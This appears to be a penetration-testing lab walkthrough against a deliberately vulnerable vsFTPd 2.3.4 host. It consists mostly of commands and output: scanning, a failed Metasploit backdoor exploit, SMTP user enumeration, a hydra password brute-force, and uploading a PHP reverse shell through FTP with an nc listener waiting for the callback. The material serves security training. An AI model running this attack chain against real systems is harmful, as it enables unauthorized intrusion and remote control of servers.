# Targeting vsFTPd

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap -sV -sC -p21 10.5.28.31
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-15 10:26 IST
Nmap scan report for demo.ine.local (10.5.28.31)
Host is up (0.0022s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
<strong>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</strong>|_Can't get directory listing: PASV IP 172.17.0.2 is not the same as 10.5.28.31
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.26.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
</code></pre>

```sh
root@attackdefense:~# ftp 10.5.28.31 21
Connected to 10.5.28.31.
220 (vsFTPd 2.3.4)
Name (10.5.28.31:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```sh
root@attackdefense:~# searchsploit vsftpd
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption      | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)      | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)      | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                    | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                           | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)              | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                             | multiple/remote/49719.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


root@attackdefense:~# searchsploit -m 49757
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
File Type: Python script, ASCII text executable

Copied to: /root/49757.py

```

<pre class="language-sh"><code class="lang-sh">msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor                                                                          

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.5.28.31
rhosts => 10.5.28.31
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.5.28.31:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.5.28.31:21 - USER: 331 Please specify the password.
<strong>[*] Exploit completed, but no session was created.
</strong>msf6 exploit(unix/ftp/vsftpd_234_backdoor) >      
</code></pre>

```sh
root@attackdefense:~# nmap -sV -p25 10.5.28.31
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-15 10:43 IST
Nmap scan report for demo.ine.local (10.5.28.31)
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
Service Info: Host:  metasploitable.localdomain

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.51 seconds
```

```sh
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
msf6 > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

msf6 > use 0
msf6 auxiliary(scanner/smtp/smtp_enum) > set rhosts 10.5.28.31
rhosts => 10.5.28.31
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.5.28.31:25         - 10.5.28.31:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
[+] 10.5.28.31:25         - 10.5.28.31:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
[*] 10.5.28.31:25         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -l service -P /usr/share/wordlists/metasploit/unix_users.txt 10.5.28.31 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC &#x26; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 11:10:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ftp://10.5.28.31:21/
<strong>[21][ftp] host: 10.5.28.31   login: service   password: service
</strong>1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 11:10:33

</code></pre>

```sh
root@attackdefense:~# ftp 10.5.28.31 21
Connected to 10.5.28.31.
220 (vsFTPd 2.3.4)
Name (10.5.28.31:root): service
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /home/service
ftp> cd /
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    1 0        0            4096 Jan 28  2018 bin
drwxr-xr-x    4 0        0            4096 May 14  2012 boot
lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -> media/cdrom
-rw-------    1 0        0         1499136 Jan 28  2018 core
drwxr-xr-x    5 0        0             400 Jan 15 04:40 dev
drwxr-xr-x    1 0        0            4096 May 20  2021 etc
drwxr-xr-x    1 0        0            4096 Apr 16  2010 home
drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd
lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x    1 0        0            4096 Jan 28  2018 lib
drwx------    2 0        0            4096 Mar 16  2010 lost+found
drwxr-xr-x    4 0        0            4096 Mar 16  2010 media
drwxr-xr-x    3 0        0            4096 Jul 17  2017 mnt
-rw-------    1 0        0           15915 Jan 15 04:40 nohup.out
drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt
dr-xr-xr-x  241 0        0               0 Jan 15 04:40 proc
drwxr-xr-x    1 0        0            4096 May 20  2021 root
drwxr-xr-x    2 0        0            4096 May 14  2012 sbin
drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv
dr-xr-xr-x   13 0        0               0 Jan 15 04:40 sys
drwxrwxrwt    1 0        0            4096 Jan 15 04:45 tmp
drwxr-xr-x    1 0        0            4096 Apr 28  2010 usr
drwxr-xr-x    1 0        0            4096 May 20  2012 var
lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
226 Directory send OK.
ftp>
```

```sh
root@attackdefense:~# ls -al /usr/share/webshells/php/
findsocket/            php-backdoor.php       php-reverse-shell.php  qsd-php-backdoor.php   simple-backdoor.php
root@attackdefense:~# cp /usr/share/webshells/php/php-reverse-shell.php .
root@attackdefense:~# mv php-reverse-shell.php shell.php
root@attackdefense:~# vim shell.php
```

<figure><img src="../../.gitbook/assets/Screenshot from 2024-01-15 11-23-11.png" alt=""><figcaption></figcaption></figure>

```sh
root@attackdefense:~# nc -nvlp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```

```
ftp> cd /var/www
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||15667|).
ftp: Can't connect to `10.5.28.31:15667': Connection refused
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxrwt    2 0        0            4096 May 20  2012 dav
drwxr-xr-x    8 33       33           4096 May 20  2012 dvwa
-rw-r--r--    1 33       33            891 May 20  2012 index.php
drwxr-xr-x   10 33       33           4096 May 14  2012 mutillidae
drwxr-xr-x   11 33       33           4096 May 14  2012 phpMyAdmin
-rw-r--r--    1 33       33             19 Apr 16  2010 phpinfo.php
drwxr-xr-x    3 33       33           4096 May 14  2012 test
drwxrwxr-x   22 33       33          20480 Apr 19  2010 tikiwiki
drwxrwxr-x   22 33       33          20480 Apr 16  2010 tikiwiki-old
drwxr-xr-x    7 33       33           4096 Apr 16  2010 twiki
226 Directory send OK.
ftp> cd dav
250 Directory successfully changed.
ftp> put shell.php 
local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |***********************************************|  5492       29.42 MiB/s    00:00 ETA
226 Transfer complete.
5492 bytes sent in 00:00 (1.30 MiB/s)
```
